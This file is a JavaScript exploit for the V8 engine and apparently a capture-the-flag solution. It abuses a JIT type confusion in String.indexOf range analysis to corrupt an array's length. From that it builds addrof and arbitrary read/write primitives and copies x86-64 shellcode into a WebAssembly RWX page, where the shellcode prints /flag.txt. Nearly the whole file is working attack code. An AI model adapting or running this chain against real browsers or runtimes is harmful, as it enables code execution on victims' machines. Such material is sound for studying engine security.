
let conversion_array = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_array);
let int_view = new BigUint64Array(conversion_array);

BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
}

BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}

Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}

function gc() {
    for (var i = 0; i < 0x10000; ++i)
        var a = new ArrayBuffer();
}

function foo(b){
	let a = "aaaaa";

	let result = a.indexOf(b);	
    // Type confusion from https://hackmd.io/@n00bsh1t/UIUCTF-v8
	//actual = -1, typer = [536870887, 536870888]
	//why this value? because kStringIndex range is [0, 536870888]
	result = Math.max(result, 536870887);

	//actual = -536870882, typer = [6,7]
	result -= 536870881;

	//actual = -1024, typer = [0,0]
	result >>= 0x13;

	//actual = -1021, typer = [3,3]
	result += 3;

	//return result;
	let arr = new Array(result);
	arr[0] = 1.1;
	return arr
}

for (var i = 0; i < 0x10000; i++){
	foo("b");
}

gc();

let corrupted = foo("b");
let arr = new Float64Array(1);
let arr_addrof = [{}];

let heap_upper = corrupted[0x13].f2i() & 0xffffffff00000000n;
console.log("Heap upper " + heap_upper.hex());

let obj = {};

function addrof(obj) {
    arr_addrof[0] = obj;
    return (corrupted[0x1c].f2i() & 0xffffffffn) | heap_upper;
}

let obj_addr = addrof(obj);
console.log("obj addr = ", obj_addr.hex());

let elem_0x13 = corrupted[0x13];
let elem_0x14 = corrupted[0x14];

function arb64_read(addr) {
    corrupted[0x13] = ((addr & 0xffffffff00000000n) | 7n).i2f();
    corrupted[0x14] = (((addr & 0xffffffffn)- 8n) | 1n).i2f();
    return arr[0].f2i();
}

function arb64_write(where, what) {
    corrupted[0x13] = ((where & 0xffffffff00000000n) | 7n).i2f();
    corrupted[0x14] = (((where & 0xffffffffn) - 8n) | 1n).i2f();
    arr[0] = what.i2f();
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var wasm_instance_addr = addrof(wasm_instance);
var shellcode_addr = arb64_read(wasm_instance_addr - 1n + 0x68n);

console.log("RWX here : " + shellcode_addr.hex());

// cat("/flag.txt") -> exit(0x4d)
shellcode = [
0xb848746a,
0x616c662f,
0x78742e67,
0x58026a50,
0x31e78948,
0x50f99f6,
0xffffba41,
0x89487fff,
0x58286ac6,
0x995f016a,
0x4d6a050f,
0x583c6a5f,
0x50f,

];

function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);

    let buf_addr = addrof(buf);
    let backing_store = arb64_write((buf_addr - 1n) + 0x14n, addr);
    
    for(let i=0; i<shellcode.length; i++) {
        dataview.setUint32(i*4, shellcode[i], true);
    }
}


copy_shellcode(shellcode_addr, shellcode);
f();

// END
